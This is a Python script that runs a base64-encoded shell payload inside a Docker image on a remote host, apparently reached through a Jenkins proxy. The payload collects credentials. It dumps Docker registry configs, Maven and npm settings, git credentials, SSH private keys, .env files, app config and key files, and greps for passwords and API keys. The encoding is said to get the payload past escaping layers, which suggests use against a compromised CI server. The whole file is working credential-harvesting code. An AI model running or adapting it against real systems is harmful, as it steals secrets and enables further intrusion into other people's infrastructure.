"""
Hunt secrets inside a docker image on the remote host (via Jenkins proxy).
The hunt script is base64-encoded to survive all escaping layers.
Usage:
  python image_hunt.py <image> [outfile]
"""
import sys, os, io, json, base64

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from docker_run import run_container

HUNT_SCRIPT = r"""
echo "=== ID ==="; id
echo "=== HOME_LS ==="
ls -la /root /home /home/* /opt /usr/local /app /deployments /var/lib/jenkins 2>/dev/null | head -80
echo "=== DOCKER_CONFIGS ==="
for f in /root/.docker/config.json /home/*/.docker/config.json /var/lib/jenkins/.docker/config.json /root/.dockercfg /home/*/.dockercfg; do
  [ -f "$f" ] && echo "--- $f ---" && cat "$f"
done
echo "=== M2_SETTINGS ==="
for f in /root/.m2/settings.xml /home/*/.m2/settings.xml /var/lib/jenkins/.m2/settings.xml /usr/share/maven/conf/settings.xml /opt/maven/conf/settings.xml; do
  [ -f "$f" ] && echo "--- $f ---" && cat "$f"
done
echo "=== NPM_GRADLE_GIT ==="
for f in /home/*/.npmrc /root/.npmrc /home/*/.gradle/gradle.properties /root/.gradle/gradle.properties /home/*/.gitconfig /root/.gitconfig /home/*/.git-credentials /root/.git-credentials; do
  [ -f "$f" ] && echo "--- $f ---" && cat "$f"
done
echo "=== SSH_KEYS ==="
for d in /root/.ssh /home/*/.ssh /var/lib/jenkins/.ssh; do
  [ -d "$d" ] && ls -la "$d" && for f in "$d"/*; do [ -f "$f" ] && echo "--- $f ---" && cat "$f"; done
done
echo "=== ENV_FILES ==="
find / -xdev -maxdepth 5 \( -name ".env" -o -name "*.env" -o -name "env.list" \) 2>/dev/null | grep -v -E "^/(proc|sys)" | while read f; do echo "--- $f ---"; cat "$f"; done
echo "=== APP_CONFIGS ==="
find /app /opt /srv /home /usr/local /var/www /deployments /config /var/lib/jenkins -xdev -maxdepth 5 \( -name "*.properties" -o -name "application*.yml" -o -name "application*.yaml" -o -name "bootstrap*.yml" -o -name "config*.php" -o -name "wp-config*" -o -name "settings*.xml" -o -name "context.xml" -o -name "datasources.xml" -o -name "*.pem" -o -name "*.key" \) 2>/dev/null | head -60 | while read f; do echo "--- $f ---"; head -c 4000 "$f"; echo; done
echo "=== DEPLOY_SCRIPTS ==="
find / -xdev -maxdepth 4 \( -name "deploy*.sh" -o -name "entrypoint*.sh" -o -name "start*.sh" -o -name "run*.sh" \) 2>/dev/null | grep -v -E "/(proc|sys|usr/lib|usr/share|etc/init.d)/" | head -30 | while read f; do echo "--- $f ---"; head -c 3000 "$f"; echo; done
echo "=== GREP_CREDS ==="
grep -rIl -E "(password|passwd|secret|api[_-]?key|BEGIN.*PRIVATE KEY)" /app /opt /srv /home /root /usr/local/etc /var/lib/jenkins 2>/dev/null | grep -v -E "(node_modules|/proc/|/sys/)" | head -40
echo "=== HUNT_DONE ==="
"""


def hunt(image, outfile=None):
    b64 = base64.b64encode(HUNT_SCRIPT.encode()).decode()
    cmd = ["-c", f"echo {b64} | base64 -d | sh"]
    result = run_container(image, cmd, timeout=300, entrypoint=["/bin/sh"])
    # extract logs between markers
    i = result.find("LOGS_BEGIN")
    j = result.find("LOGS_END")
    logs = result[i + 10:j] if i >= 0 and j > i else result
    # strip docker stream 8-byte frame headers (binary noise)
    clean = []
    for line in logs.splitlines():
        clean.append(line.lstrip("\x00\x01\x02\x03\x04\x05\x06\x07\x08"))
    text = "\n".join(clean)
    if outfile:
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(text)
        print(f"SAVED -> {outfile} ({len(text)} bytes)")
    return text


if __name__ == "__main__":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    image = sys.argv[1]
    outfile = sys.argv[2] if len(sys.argv) > 2 else None
    text = hunt(image, outfile)
    print(text[:6000])
